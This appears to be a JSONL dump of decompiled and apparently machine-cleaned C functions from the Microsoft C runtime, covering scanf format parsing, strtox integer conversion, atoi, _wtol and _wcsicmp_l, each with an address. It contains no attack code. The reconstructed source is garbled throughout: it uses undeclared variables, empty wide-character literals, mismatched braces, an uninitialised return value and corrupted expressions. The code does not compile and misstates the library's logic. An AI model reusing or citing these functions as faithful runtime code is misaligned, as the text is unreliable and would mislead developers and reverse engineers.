{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::should_default_to_wide", "Address": "10023618", "Source Code": "bool __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::should_default_to_wide\n(format_string_parser<wchar_t> *this, wchar_t param_1)\n{\n    \n    if ((param_1 == L'C') || (param_1 == L'S')) {\n        return false; \n    } \n    \n    \n    return (*(int *)(this + 0x28) == 0xb) || ((*(uint *)this & 2) != 0);\n}"}
{"Function Name": "__crt_stdio_input::scanset_buffer<wchar_t>::test", "Address": "1002364b", "Source Code": "bool __thiscall\n__crt_stdio_input::scanset_buffer<wchar_t>::test(scanset_buffer<wchar_t> *this, wchar_t param_1)\n{\n    \n    return (scanset_storage<2>::data((scanset_storage<2> *)this)[(ushort)param_1 >> 3] \n            & (byte)(1 << ((byte)param_1 & 7))) \n            != 0; \n}"}
{"Function Name": "__crt_stdio_input::to_floating_point_length", "Address": "10023683", "Source Code": "uint __cdecl __crt_stdio_input::to_floating_point_length(length_modifier length_modifier)\n{\n    \n    if (length_modifier == 0) {\n        \n        return 4;\n    }\n    \n    if (length_modifier == 3 || length_modifier == 8) {\n        \n        return 8;\n    }\n    \n    return 0;\n}"}
{"Function Name": "__crt_stdio_input::to_integer_length", "Address": "100236a6", "Source Code": "uint __cdecl __crt_stdio_input::to_integer_length(length_modifier length_modifier_value)\n{\n    \n    switch(length_modifier_value) {\n        \n        case 0:\n        case 3:\n        case 6:\n        case 7:\n        case 9:\n            return 4; \n        case 1:\n            return 1; \n        case 2:\n            return 2; \n        \n        case 4:\n        case 5:\n        case 10:\n            return 8; \n        default:\n            return 0; \n    }\n}"}
{"Function Name": "__crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget", "Address": "100236fe", "Source Code": "void __thiscall\n__crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget\n(input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*this,wchar_t param_1)\n{\n    \n    int *piVar1 = (int *)(this + 0x10);\n    \n    \n    int iVar2 = *piVar1;\n    \n    \n    *piVar1 -= 1;\n    \n    \n    *(uint *)(this + 0x14) -= 1 + (uint)(iVar2 != 0);\n    \n    \n    uint uVar3 = *(uint *)(this + 0xc);\n    \n    \n    if (((*(uint *)(this + 8) | uVar3) == 0) ||\n        (*(uint *)(this + 0x14) <= uVar3 &&\n        (*(uint *)(this + 0x14) < uVar3 || (*(uint *)(this + 0x10) <= *(uint *)(this + 8)))))) {\n        \n        \n        if ((param_1 != L'\\0') && (param_1 != L'\\xffff')) {\n            \n            __crt_stdio_input::string_input_adapter<wchar_t>::unget\n            (*(string_input_adapter<wchar_t> **)this, param_1);\n        }\n    }\n    \n    \n    return;\n}"}
{"Function Name": "__crt_stdio_input::string_input_adapter<wchar_t>::unget", "Address": "10023743", "Source Code": "void __thiscall\n__crt_stdio_input::string_input_adapter<wchar_t>::unget\n(string_input_adapter<wchar_t> *this, ushort param_1)\n{\n    \n    int iVar1 = *(int *)(this + 8);\n    \n    \n    \n    if ((iVar1 != *(int *)this) && ((iVar1 != *(int *)(this + 4) || (param_1 != 0xffff)))) {\n        \n        *(int *)(this + 8) = iVar1 - 2;\n    }\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::validate", "Address": "10023769", "Source Code": "bool __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::validate(format_string_parser<wchar_t> *this)\n{\n    \n    if (*(int *)(this + 8) == 0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n        \n        return false;\n    }\n    \n    return true;\n}"}
{"Function Name": "FUN_10023785", "Address": "10023785", "Source Code": "uint __fastcall FUN_10023785(int *inputArray)\n{\n    \n    if ((*inputArray != 0) && (inputArray[6] != 0)) {\n        return 1; \n    }\n    \n    \n    undefined4 *resultPointer = (undefined4 *)FUN_100253b8();\n    \n    \n    *resultPointer = 0x16;\n    \n    \n    return FUN_1001de96() & 0xffffff00;\n}"}
{"Function Name": "__crt_stdio_input::string_input_adapter<wchar_t>::validate", "Address": "100237a6", "Source Code": "bool __thiscall\n__crt_stdio_input::string_input_adapter<wchar_t>::validate(string_input_adapter<wchar_t> *this)\n{\n    \n    if ((*(uint *)(this + 8) != 0) && (*(uint *)(this + 8) <= *(uint *)(this + 4))) {\n        \n        return true;\n    }\n    \n    *(undefined4 *)FUN_100253b8() = 0x16;\n    \n    FUN_1001de96();\n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::write_integer", "Address": "10023850", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::write_integer(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*this,__uint64 param_1,bool param_2)\n{\n    \n    __uint64 *p_Var1 = *(__uint64 **)(*(int *)(this + 0x54) += 4 - 4);\n    \n    \n    if (p_Var1 == (__uint64 *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n        return false; \n    }\n    \n    \n    if (param_2) {\n        *(int *)(this + 0x58) += 1;\n    }\n    \n    \n    uint uVar4 = format_string_parser<wchar_t>::length((format_string_parser<wchar_t> *)(this + 0x18));\n    \n    \n    if (uVar4 == 1) {\n        *(undefined *)p_Var1 = (undefined)param_1; \n    } else if (uVar4 == 2) {\n        *(short *)p_Var1 = (short)param_1; \n    } else if (uVar4 == 4) {\n        *(int *)p_Var1 = (int)param_1; \n    } else if (uVar4 == 8) {\n        *p_Var1 = param_1; \n    } else {\n        return false; \n    }\n    \n    return true; \n}"}
{"Function Name": "__crt_strtox::is_overflow_condition<unsigned_long>", "Address": "100239c9", "Source Code": "bool __cdecl __crt_strtox::is_overflow_condition<unsigned_long>(uint flags, ulong value)\n{\n    \n    if ((flags & 4) == 0 &&  \n        ((flags & 1) == 0 ||  \n        ((flags & 2) == 0 && value < 0x80000001) ||  \n        (flags & 2) != 0 && value < 0x80000000))) {  \n        return false;  \n    }\n    return true;  \n}"}
{"Function Name": "__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<char>_>", "Address": "10023a17", "Source Code": "ulong __cdecl\n__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<char>_>\n(__acrt_ptd **param_1, byte *param_2, byte **param_3, uint param_4, char param_5)\n{\n    bool bVar2; \n    int iVar4; \n    uint uVar5; \n    uint uVar6; \n    byte bVar7; \n    ulong uVar8; \n    uint uVar9; \n    uint local_10 = 0; \n    uint local_c = (uint)(param_5 != '\\0'); \n    uint local_18; \n    byte *local_1c = param_2; \n    \n    bVar2 = c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)&param_2);\n    uVar9 = param_4; \n    \n    if (bVar2) {\n        \n        if ((param_4 == 0) || ((1 < (int)param_4 && ((int)param_4 < 0x25)))) {\n            FUN_1001bfff(&local_10, param_1); \n            do {\n                bVar7 = *param_2++; \n                iVar4 = __ischartype_l((uint)bVar7, 8, &local_28); \n            } while (iVar4 != 0); \n            \n            if (bVar7 == 0x2d) {\n                local_c |= 2; \n                bVar7 = *param_2++; \n            } else if (bVar7 == 0x2b) {\n                bVar7 = *param_2++; \n            }\n            \n            if ((uVar9 == 0) || (uVar9 == 0x10)) {\n                \n                if ((byte)(bVar7 - 0x30) < 10) {\n                    iVar4 = (char)bVar7 + -0x30; \n                } else if ((byte)(bVar7 + 0x9f) < 0x1a) {\n                    iVar4 = (char)bVar7 + -0x57; \n                } else if ((byte)(bVar7 + 0xbf) < 0x1a) {\n                    iVar4 = (char)bVar7 + -0x37; \n                } else {\n                    iVar4 = -1; \n                }\n                \n                if (iVar4 == 0) {\n                    byte bVar1 = *param_2; \n                    \n                    if ((bVar1 == 0x78) || (bVar1 == 0x58)) {\n                        if (uVar9 == 0) {\n                            uVar9 = 0x10; \n                        }\n                        bVar7 = param_2[1]; \n                        param_2 += 2; \n                    } else {\n                        if (uVar9 == 0) {\n                            uVar9 = 8; \n                        }\n                        param_2++; \n                        c_string_character_source<char>::unget((c_string_character_source<char> *)&param_2, bVar1); \n                    }\n                } else if (uVar9 == 0) {\n                    uVar9 = 10; \n                }\n            }\n            \n            uint local_14 = (uint)(0xffffffff / (ulonglong)uVar9); \n            local_18 = (uint)(0xffffffff % (ulonglong)uVar9); \n            while (true) {\n                \n                if ((byte)(bVar7 - 0x30) < 10) {\n                    uVar5 = (int)(char)bVar7 - 0x30; \n                } else if ((byte)(bVar7 + 0x9f) < 0x1a) {\n                    uVar5 = (int)(char)bVar7 - 0x57; \n                } else if ((byte)(bVar7 + 0xbf) < 0x1a) {\n                    uVar5 = (int)(char)bVar7 - 0x37; \n                } else {\n                    uVar5 = 0xffffffff; \n                }\n                \n                if ((uVar5 == 0xffffffff) || (uVar9 <= uVar5)) break; \n                uVar6 = local_c | 8; \n                \n                if ((local_10 < local_14) || ((local_10 == local_14 && (uVar5 <= local_18)))) {\n                    local_10 = local_10 * uVar9 + uVar5; \n                } else {\n                    uVar6 = local_c | 0xc; \n                }\n                bVar7 = *param_2++; \n            }\n            \n            c_string_character_source<char>::unget((c_string_character_source<char> *)&param_2, (char)local_10);\n            uVar9 = local_c; \n            uVar8 = local_10; \n            \n            if ((local_c & 8) == 0) {\n                uVar8 = 0; \n                param_2 = local_1c; \n            } else {\n                bVar2 = is_overflow_condition<unsigned_long>(local_c, local_10); \n                if (bVar2) {\n                    undefined4 *puVar3 = (undefined4 *)FUN_100253b8(); \n                    *puVar3 = 0x22; \n                    if ((uVar9 & 1) == 0) {\n                        uVar8 = 0xffffffff; \n                    } else if ((uVar9 & 2) == 0) {\n                        uVar8 = 0x7fffffff; \n                    } else {\n                        uVar8 = 0x80000000; \n                    }\n                } else if ((uVar9 & 2) != 0) {\n                    uVar8 = -uVar8; \n                }\n            }\n            \n            if (local_20 != '\\0') {\n                *(uint *)(local_10 + 0x350) &= 0xfffffffd; \n            }\n            goto LAB_10023a50; \n        }\n        undefined4 *puVar3 = (undefined4 *)FUN_100253b8(); \n        *puVar3 = 0x16; \n        FUN_1001de96(); \n    }\n    uVar8 = 0; \nLAB_10023a50:\n    \n    if (param_3 != (byte **)0x0) {\n        *param_3 = param_2; \n    }\n    return uVar8; \n}"}
{"Function Name": "__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<wchar_t>_>", "Address": "10023c3f", "Source Code": "ulong __cdecl\n__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<wchar_t>_>\n(__acrt_ptd **param_1,wchar_t *param_2,wchar_t **param_3,uint param_4,char param_5)\n{\n    bool bVar1; \n    int iVar3; \n    uint uVar4; \n    uint uVar5; \n    ulong uVar6; \n    uint uVar7; \n    uint uVar8; \n    wchar_t wVar9; \n    uint uVar10; \n    uint local_c = 0; \n    \n    bVar1 = c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)&param_2);\n    if (bVar1) {\n        \n        if ((param_4 == 0) || ((1 < (int)param_4 && ((int)param_4 < 0x25)))) {\n            FUN_1001bfff(NULL,param_1); \n            do {\n                wVar9 = *param_2++; \n                iVar3 = _iswctype(wVar9,8); \n            } while (iVar3 != 0); \n            \n            uVar7 = (uint)(param_5 != '\\0'); \n            if (wVar9 == L'-') {\n                uVar7 |= 2; \n                LAB_10023cd8:\n                wVar9 = *param_2++; \n            }\n            else if (wVar9 == L'+') goto LAB_10023cd8; \n            \n            uVar10 = (uint)(ushort)wVar9; \n            \n            \n            if ((param_4 != 0) && (param_4 != 0x10)) goto LAB_10023fe0; \n            if ((ushort)wVar9 < 0x30) goto LAB_10023f63; \n            if ((ushort)wVar9 < 0x3a) { \n                iVar3 = uVar10 - 0x30; \n                LAB_10023f5e:\n                if (iVar3 == -1) goto LAB_10023f63; \n            }\n            else {\n                \n                if (0xff0f < (ushort)wVar9) {\n                    if ((ushort)wVar9 < 0xff1a) {\n                        iVar3 = uVar10 - 0xff10; \n                    }\n                    else {\n                        iVar3 = -1; \n                    }\n                    goto LAB_10023f5e; \n                }\n                \n                \n                goto LAB_10023f5e; \n            }\n            LAB_10023f63:\n            \n            if ((((ushort)wVar9 < 0x41) || (0x5a < (ushort)wVar9)) && (0x19 < (ushort)(wVar9 + L''))) {\n                iVar3 = -1; \n            }\n            else {\n                uVar4 = uVar10; \n                if ((ushort)(wVar9 + L'') < 0x1a) {\n                    uVar4 = uVar10 - 0x20; \n                }\n                iVar3 = uVar4 - 0x37; \n            }\n        }\n        if (iVar3 == 0) {\n            \n            wVar9 = *param_2; \n            if ((wVar9 == L'x') || (wVar9 == L'X')) {\n                if (param_4 == 0) {\n                    param_4 = 0x10; \n                }\n                uVar10 = (uint)(ushort)param_2[1]; \n                param_2 += 2; \n            }\n            else {\n                if (param_4 == 0) {\n                    param_4 = 8; \n                }\n                param_2++; \n                c_string_character_source<wchar_t>::unget((c_string_character_source<wchar_t> *)&param_2,wVar9); \n            }\n        }\n        else if (param_4 == 0) {\n            param_4 = 10; \n        }\n        LAB_10023fe0:\n        uVar4 = (uint)(0xffffffff / (ulonglong)param_4); \n        do {\n            wVar9 = (wchar_t)uVar10; \n            if ((ushort)wVar9 < 0x30) goto LAB_1002424b; \n            if ((ushort)wVar9 < 0x3a) {\n                uVar5 = uVar10 - 0x30; \n                LAB_10024246:\n                if (uVar5 == 0xffffffff) goto LAB_1002424b; \n            }\n            else {\n                \n                \n                goto LAB_10024246; \n            }\n            LAB_1002424b:\n            \n            if ((((ushort)wVar9 < 0x41) || (0x5a < (ushort)wVar9)) && ((ushort)0x19 < (ushort)(wVar9 + L''))) {\n                uVar5 = 0xffffffff; \n            }\n            else {\n                if ((ushort)(wVar9 + L'') <= (ushort)0x19) {\n                    uVar10 = uVar10 - 0x20; \n                }\n                uVar5 = uVar10 - 0x37; \n            }\n            if ((uVar5 == 0xffffffff) || (param_4 <= uVar5)) goto LAB_100242b1; \n            uVar8 = uVar7 | 8; \n            if ((local_c < uVar4) || \n                ((local_c == uVar4 && (uVar5 <= (uint)(0xffffffff % (ulonglong)param_4))))) {\n                local_c = local_c * param_4 + uVar5; \n            }\n            else {\n                uVar8 = uVar7 | 0xc; \n            }\n            uVar10 = (uint)(ushort)*param_2++; \n            uVar7 = uVar8; \n        } while (true); \n    }\n    FUN_100253b8(); \n    *param_3 = param_2; \n    return uVar6; \n    LAB_100242b1:\n    c_string_character_source<wchar_t>::unget((c_string_character_source<wchar_t> *)&param_2,wVar9); \n    uVar6 = local_c; \n    if ((uVar7 & 8) == 0) {\n        uVar6 = 0; \n    }\n    else {\n        bVar1 = is_overflow_condition<unsigned_long>(uVar7,local_c); \n        if (bVar1) {\n            FUN_100253b8(); \n            if ((uVar7 & 1) == 0) {\n                uVar6 = 0xffffffff; \n            }\n            else if ((uVar7 & 2) == 0) {\n                uVar6 = 0x7fffffff; \n            }\n            else {\n                uVar6 = 0x80000000; \n            }\n        }\n        else if ((uVar7 & 2) != 0) {\n            uVar6 = -uVar6; \n        }\n    }\n    return uVar6; \n}"}
{"Function Name": "FUN_10024324", "Address": "10024324", "Source Code": "undefined8 __cdecl\nFUN_10024324(__acrt_ptd **param_1,wchar_t *param_2,wchar_t **param_3,uint param_4,char param_5)\n{\n    ulonglong uVar1; \n    bool bVar2; \n    undefined4 *puVar3; \n    int iVar4; \n    uint uVar5; \n    uint uVar7; \n    wchar_t wVar6; \n    uint uVar8; \n    ulonglong uVar9; \n    longlong lVar10; \n    int local_3c [3]; \n    char local_30; \n    uint local_24; \n    uint local_28; \n    uint local_20; \n    uint local_1c; \n    uint local_10; \n    uint local_c; \n    \n    bVar2 = __crt_strtox::c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)&param_2);\n    uVar8 = param_4; \n    \n    if (bVar2) {\n        \n        if ((param_4 == 0) || ((1 < (int)param_4 && ((int)param_4 < 0x25)))) {\n            FUN_1001bfff(local_3c,param_1); \n            local_c = 0; \n            local_10 = 0; \n            \n            \n            do {\n                wVar6 = *param_2; \n                param_2 = param_2 + 1; \n                iVar4 = _iswctype(wVar6,8); \n            } while (iVar4 != 0); \n            \n            local_24 = (uint)(param_5 != '\\0'); \n            \n            \n            if (wVar6 == L'-') {\n                local_24 |= 2; \n                goto LAB_100243cd; \n            }\n            else if (wVar6 == L'+') goto LAB_100243cd; \n            \n            uVar7 = (uint)(ushort)wVar6; \n            iVar4 = 0x30; \n            \n            \n            if ((uVar8 != 0) && (uVar8 != 0x10)) goto LAB_10024614; \n            \n            \n            if ((ushort)wVar6 < 0x30) {\n                LAB_10024597:\n                \n                if ((((ushort)wVar6 < 0x41) || (0x5a < (ushort)wVar6)) && (0x19 < (ushort)(wVar6 + L''))) {\n                    iVar4 = -1; \n                }\n                else {\n                    uVar5 = uVar7; \n                    if ((ushort)(wVar6 + L'') < 0x1a) {\n                        uVar5 = uVar7 - 0x20; \n                    }\n                    iVar4 = uVar5 - 0x37; \n                }\n            }\n            else {\n                \n                if ((ushort)wVar6 < 0x3a) {\n                    LAB_100243fe:\n                    uVar8 = uVar7 - iVar4; \n                }\n                else {\n                    iVar4 = 0xff10; \n                    if ((ushort)wVar6 < 0xff10) {\n                        iVar4 = 0x660; \n                        \n                        if (((ushort)wVar6 < 0x660) ||\n                        ((0x669 < (ushort)wVar6 &&\n                        ((iVar4 = 0x6f0, (ushort)wVar6 < 0x6f0 ||\n                        ((0x6f9 < (ushort)wVar6 &&\n                        ((iVar4 = 0x966, (ushort)wVar6 < 0x966 ||\n                        ((0x96f < (ushort)wVar6 &&\n                        ((iVar4 = 0x9e6, (ushort)wVar6 < 0x9e6 ||\n                        ((0x9ef < (ushort)wVar6 &&\n                        ((iVar4 = 0xa66, (ushort)wVar6 < 0xa66 ||\n                        ((0xa6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xae6, (ushort)wVar6 < 0xae6 ||\n                        ((0xaef < (ushort)wVar6 &&\n                        ((iVar4 = 0xb66, (ushort)wVar6 < 0xb66 ||\n                        ((0xb6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xc66, (ushort)wVar6 < 0xc66 ||\n                        ((0xc6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xce6, (ushort)wVar6 < 0xce6 ||\n                        ((0xcef < (ushort)wVar6 &&\n                        ((iVar4 = 0xd66, (ushort)wVar6 < 0xd66 ||\n                        ((0xd6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xe50, (ushort)wVar6 < 0xe50 ||\n                        ((0xe59 < (ushort)wVar6 &&\n                        ((iVar4 = 0xed0, (ushort)wVar6 < 0xed0 ||\n                        ((0xed9 < (ushort)wVar6 &&\n                        ((iVar4 = 0xf20, (ushort)wVar6 < 0xf20 ||\n                        ((0xf29 < (ushort)wVar6 &&\n                        ((iVar4 = 0x1040, (ushort)wVar6 < 0x1040 ||\n                        ((0x1049 < (ushort)wVar6 &&\n                        ((iVar4 = 0x17e0, (ushort)wVar6 < 0x17e0 ||\n                        ((0x17e9 < (ushort)wVar6 &&\n                        ((iVar4 = 0x1810, (ushort)wVar6 < 0x1810 ||\n                        (0x1819 < (ushort)wVar6))))))))))))))))))))))))))))))))\n                        )))))))))))))))))))))))))))))) goto LAB_10024597; \n                    goto LAB_100243fe; \n                }\n                \n                if ((ushort)wVar6 < 0xff1a) goto LAB_100243fe; \n                iVar4 = -1; \n            }\n            \n            if (iVar4 == -1) goto LAB_10024597; \n        }\n        \n        if (iVar4 == 0) {\n            wVar6 = *param_2; \n            if ((wVar6 == L'x') || (wVar6 == L'X')) {\n                if (uVar8 == 0) {\n                    uVar8 = 0x10; \n                    param_4 = uVar8; \n                }\n                uVar7 = (uint)(ushort)param_2[1]; \n                param_2 = param_2 + 2; \n            }\n            else {\n                if (uVar8 == 0) {\n                    uVar8 = 8; \n                    param_4 = uVar8; \n                }\n                param_2 = param_2 + 1; \n                __crt_strtox::c_string_character_source<wchar_t>::unget((c_string_character_source<wchar_t> *)&param_2,wVar6); \n            }\n        }\n        else if (uVar8 == 0) {\n            uVar8 = 10; \n            param_4 = uVar8; \n        }\n        LAB_10024614:\n        local_28 = uVar8; \n        uVar9 = __aulldvrm(0xffffffff,0xffffffff,uVar8,0); \n        uVar1 = CONCAT44(local_10,local_c); \n        local_20 = uVar8; \n        do {\n            local_10 = (uint)(uVar1 >> 0x20); \n            local_c = (uint)uVar1; \n            iVar4 = 0x30; \n            wVar6 = (wchar_t)uVar7; \n            \n            if ((ushort)wVar6 < 0x30) {\n                LAB_100247e9:\n                \n                if ((((ushort)wVar6 < 0x41) || (0x5a < (ushort)wVar6)) &&\n                (0x19 < (ushort)(wVar6 + L''))) {\n                    uVar8 = 0xffffffff; \n                }\n                else {\n                    if ((ushort)(wVar6 + L'') < 0x1a) {\n                        uVar7 = uVar7 - 0x20; \n                    }\n                    uVar8 = uVar7 - 0x37; \n                }\n            }\n            else {\n                \n                if ((ushort)wVar6 < 0x3a) {\n                    LAB_10024650:\n                    uVar8 = uVar7 - iVar4; \n                }\n                else {\n                    iVar4 = 0xff10; \n                    if ((ushort)wVar6 < 0xff10) {\n                        iVar4 = 0x660; \n                        \n                        if (((ushort)wVar6 < 0x660) ||\n                        ((0x669 < (ushort)wVar6 &&\n                        ((iVar4 = 0x6f0, (ushort)wVar6 < 0x6f0 ||\n                        ((0x6f9 < (ushort)wVar6 &&\n                        ((iVar4 = 0x966, (ushort)wVar6 < 0x966 ||\n                        ((0x96f < (ushort)wVar6 &&\n                        ((iVar4 = 0x9e6, (ushort)wVar6 < 0x9e6 ||\n                        ((0x9ef < (ushort)wVar6 &&\n                        ((iVar4 = 0xa66, (ushort)wVar6 < 0xa66 ||\n                        ((0xa6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xae6, (ushort)wVar6 < 0xae6 ||\n                        ((0xaef < (ushort)wVar6 &&\n                        ((iVar4 = 0xb66, (ushort)wVar6 < 0xb66 ||\n                        ((0xb6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xc66, (ushort)wVar6 < 0xc66 ||\n                        ((0xc6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xce6, (ushort)wVar6 < 0xce6 ||\n                        ((0xcef < (ushort)wVar6 &&\n                        ((iVar4 = 0xd66, (ushort)wVar6 < 0xd66 ||\n                        ((0xd6f < (ushort)wVar6 &&\n                        ((iVar4 = 0xe50, (ushort)wVar6 < 0xe50 ||\n                        ((0xe59 < (ushort)wVar6 &&\n                        ((iVar4 = 0xed0, (ushort)wVar6 < 0xed0 ||\n                        ((0xed9 < (ushort)wVar6 &&\n                        ((iVar4 = 0xf20, (ushort)wVar6 < 0xf20 ||\n                        ((0xf29 < (ushort)wVar6 &&\n                        ((iVar4 = 0x1040, (ushort)wVar6 < 0x1040 ||\n                        ((0x1049 < (ushort)wVar6 &&\n                        ((iVar4 = 0x17e0, (ushort)wVar6 < 0x17e0 ||\n                        ((0x17e9 < (ushort)wVar6 &&\n                        ((iVar4 = 0x1810, (ushort)wVar6 < 0x1810 ||\n                        (0x1819 < (ushort)wVar6))))))))))))))))))))))))))))))))\n                        )))))))))))))))))))))))))))))) goto LAB_100247e9; \n                    goto LAB_10024650; \n                }\n                \n                if ((ushort)wVar6 < 0xff1a) goto LAB_10024650; \n                uVar8 = 0xffffffff; \n            }\n            \n            if (uVar8 == 0xffffffff) goto LAB_100247e9; \n        }\n        \n        if ((uVar8 == 0xffffffff) || (param_4 <= uVar8)) goto LAB_10024893; \n        \n        if ((uVar1 < uVar9) ||\n        ((uVar1 == CONCAT44(0,0) && ((local_1c != 0 || (uVar8 <= local_20)))))) {\n            local_24 |= 8; \n            lVar10 = __allmul(local_28,local_24,local_c,local_10); \n            uVar1 = lVar10 + (ulonglong)uVar8; \n        }\n        else {\n            local_24 |= 0xc; \n        }\n        uVar9 = CONCAT44(0,0); \n        uVar7 = (uint)(ushort)*param_2; \n        param_2 = param_2 + 1; \n    } while( true ); \n}\npuVar3 = (undefined4 *)FUN_100253b8(); \n*puVar3 = 0x16; \nFUN_1001de96(); \n}\nuVar7 = 0; \nuVar5 = 0; \nLAB_10024364:\nif (param_3 != (wchar_t **)0x0) {\n    *param_3 = param_2; \n}\nreturn CONCAT44(uVar5,uVar7); \nLAB_10024893:\n__crt_strtox::c_string_character_source<wchar_t>::unget((c_string_character_source<wchar_t> *)&param_2,wVar6); \nif ((local_24 & 8) == 0) {\n    param_2 = param_2; \n    uVar7 = 0; \n}\nelse {\n    bVar2 = __crt_strtox::is_overflow_condition<unsigned___int64>(local_24,CONCAT44(0,local_10)); \n    if (bVar2) {\n        puVar3 = (undefined4 *)FUN_100253b8(); \n        *puVar3 = 0x22; \n        if ((local_24 & 1) == 0) {\n            uVar7 = 0xffffffff; \n            uVar5 = 0xffffffff; \n        }\n        else if ((local_24 & 2) == 0) {\n            uVar7 = 0xffffffff; \n            uVar5 = 0x7fffffff; \n        }\n        else {\n            uVar7 = 0; \n            uVar5 = 0x80000000; \n        }\n    }\n    else {\n        uVar5 = local_20; \n        if ((local_24 & 2) != 0) {\n            uVar7 = -uVar7; \n            uVar5 = -(local_20 + (uVar7 != 0)); \n        }\n    }\n}\nif (local_30 != '\\0') {\n    *(uint *)(local_3c[0] + 0x350) = *(uint *)(local_3c[0] + 0x350) & 0xfffffffd; \n}\ngoto LAB_10024364; "}
{"Function Name": "__crt_strtox::c_string_character_source<char>::unget", "Address": "1002491b", "Source Code": "void __thiscall\n__crt_strtox::c_string_character_source<char>::unget\n(c_string_character_source<char> *this,char param_1)\n{\n    \n    *(int *)this = *(int *)this - 1;\n    \n    if ((param_1 != '\\0') && (**(char **)this != param_1)) {\n        \n        undefined4 *puVar1 = (undefined4 *)FUN_100253b8();\n        \n        \n        *puVar1 = 0x16;\n        \n        FUN_1001de96();\n    }\n}"}
{"Function Name": "__crt_strtox::c_string_character_source<wchar_t>::unget", "Address": "10024943", "Source Code": "void __thiscall\n__crt_strtox::c_string_character_source<wchar_t>::unget\n(c_string_character_source<wchar_t> *this,wchar_t param_1)\n{\n    \n    *(int *)this -= 2;\n    \n    if ((param_1 != L'\\0') && (**(wchar_t **)this != param_1)) {\n        \n        undefined4 *puVar1 = (undefined4 *)FUN_100253b8();\n        \n        \n        *puVar1 = 0x16;\n        \n        FUN_1001de96();\n    }\n}"}
{"Function Name": "__wtol", "Address": "1002496f", "Source Code": "long __cdecl __wtol(wchar_t *wide_string) \n{\n    ulong converted_long; \n    uint conversion_base = 10; \n    char conversion_flag = '\\x01'; \n    \n    \n    make_c_string_character_source<>((undefined4 *)&stack0xffffffe8, wide_string, (undefined4 *)0x0);\n    \n    \n    converted_long = __crt_strtox::parse_integer<unsigned_long, class___crt_strtox::c_string_character_source<wchar_t>_>((__acrt_ptd **)0x0, extraout_var, extraout_var_00, conversion_base, conversion_flag);\n    \n    return converted_long; \n}"}
{"Function Name": "FID_conflict:_atoi", "Address": "10024999", "Source Code": "int __cdecl FID_conflict__atoi(char *inputString)\n{\n    ulong convertedValue; \n    uint base = 10; \n    char parseOptions = '\\x01'; \n    \n    \n    make_c_string_character_source<>((undefined4 *)&stack0xffffffe8, inputString, (undefined4 *)0x0);\n    \n    \n    convertedValue = __crt_strtox::parse_integer<unsigned_long, class___crt_strtox::c_string_character_source<char>>((__acrt_ptd **)0x0, nullptr, nullptr, base, parseOptions);\n    \n    return convertedValue; \n}"}
{"Function Name": "__wcsicmp_l", "Address": "10024a58", "Source Code": "int __cdecl __wcsicmp_l(wchar_t *str1, wchar_t *str2, _locale_t locale)\n{\n    wchar_t char1; \n    wchar_t char2; \n    int comparisonResult; \n    localeinfo_struct localeInfo; \n    FUN_1001bfff(&localeData, (__acrt_ptd **)locale); \n    \n    if ((str1 == (wchar_t *)0x0) || (str2 == (wchar_t *)0x0)) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        return 0x7fffffff; \n    }\n    \n    \n    if ((localeInfo.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n        comparisonResult = (int)str1 - (int)str2; \n        do {\n            char1 = *(wchar_t *)(comparisonResult + (int)str2); \n            \n            if ((0x40 < (ushort)char1) && ((ushort)char1 < 0x5b)) {\n                char1 += L' '; \n            }\n            char2 = *str2; \n            \n            if ((0x40 < (ushort)char2) && ((ushort)char2 < 0x5b)) {\n                char2 += L' '; \n            }\n            str2++; \n        } while ((char1 != L'\\0') && (char1 == char2)); \n    } else {\n        do {\n            char1 = __towlower_l(*str1, &localeInfo); \n            str1++; \n            char2 = __towlower_l(*str2, &localeInfo); \n            str2++; \n            if (char1 == L'\\0') break; \n        } while (char1 == char2); \n    }\n    \n    comparisonResult = (uint)(ushort)char1 - (uint)(ushort)char2; \n    \n    \n    if (conditionFlag != '\\0') {\n        *(uint *)(localeData + 0x350) &= 0xfffffffd; \n    }\n    \n    return comparisonResult; \n}"}
